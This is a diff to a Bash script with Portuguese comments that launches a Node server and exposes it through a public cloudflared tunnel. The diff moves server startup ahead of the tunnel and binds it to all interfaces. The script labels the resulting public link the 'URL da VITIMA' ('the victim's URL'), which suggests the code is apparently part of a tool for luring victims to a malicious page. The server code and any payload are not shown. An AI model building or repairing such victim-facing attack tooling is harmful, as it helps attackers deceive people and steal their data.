@@ -247,7 +247,14 @@ SERVEREOF
         echo "[...] Criando tunnel... aguarde..."
         echo ""
 
-        cloudflared tunnel --url "http://localhost:$PORT" > /tmp/cf_tunnel.log 2>&1 &
+        # Garante que o servidor escuta em todas as interfaces (0.0.0.0)
+        # para o cloudflared conseguir acessar
+        export PORT
+        node "$SERVER_FILE" &
+        SERVER_PID=$!
+        sleep 2
+
+        cloudflared tunnel --url "http://0.0.0.0:$PORT" > /tmp/cf_tunnel.log 2>&1 &
         CF_PID=$!
 
         for i in $(seq 1 15); do
@@ -286,15 +293,16 @@ SERVEREOF
     echo ""
     echo "  Parar: Ctrl+C"
     echo ""
-    echo "[*] Iniciando servidor..."
-    echo ""
 
-    # --- INICIAR SERVIDOR ---
-    node "$SERVER_FILE" &
-    SERVER_PID=$!
+    # --- INICIAR SERVIDOR (se nao iniciou com cloudflare) ---
+    if [ -z "$CF_URL" ]; then
+        echo "[*] Iniciando servidor..."
+        echo ""
+        node "$SERVER_FILE" &
+        SERVER_PID=$!
+    fi
 
     if [ -n "$CF_URL" ]; then
-        sleep 2
         echo ""
         echo "  🔥 LEMBRE-SE - URL da VITIMA:"
         echo "    ${CF_URL}"
